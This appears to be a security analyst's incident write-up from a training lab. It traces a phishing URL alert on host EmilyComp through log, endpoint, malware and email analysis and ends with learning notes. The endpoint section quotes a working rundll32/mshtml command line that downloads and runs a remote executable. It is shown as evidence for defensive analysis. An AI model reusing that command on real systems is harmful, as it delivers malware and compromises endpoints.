# Investigation Process – Phishing URL Detected

## 1. Initial Triage

Alert triggered due to access to a suspicious URL.

URL:
http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php

Source Host: EmilyComp (172.16.17.49)

---

## 2. Log Analysis

Observed request to external domain:

mogagrocol.ru

- URL flagged as malicious on VirusTotal (15/95)
- Traffic was allowed

Additional logs show outbound connections to:

162.241.242.173  
67.68.210.95  
140.82.121.4  

---

## 3. Endpoint Analysis

Suspicious command execution identified:

rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')

- Abuse of rundll32.exe (LOLBIN)
- Execution of JavaScript via mshtml
- Remote download and execution of payload

---

## 4. Malware Analysis

File identified: KBDYAK.exe

- MD5: a4513379dad5233afa402cc56a8b9222  
- Detection: 66/72 → Malicious  
- Classification: Trojan  

---

## 5. Email Analysis

Multiple suspicious emails identified:

- Malicious attachment (65/71 detections)
- Social engineering content
- Suspicious sender domains

Indicates possible initial infection vector via email.

---

## 6. Conclusion

- Malicious URL confirmed
- Malware execution confirmed
- Endpoint compromised
- Malicious network communication observed

---

## Learning Notes

- Phishing URLs can lead to malware execution
- rundll32.exe can be abused for malicious execution (LOLBIN)
- Outbound connections to unknown IPs indicate possible C2 activity
- Correlating logs, endpoint activity, and threat intelligence is critical

---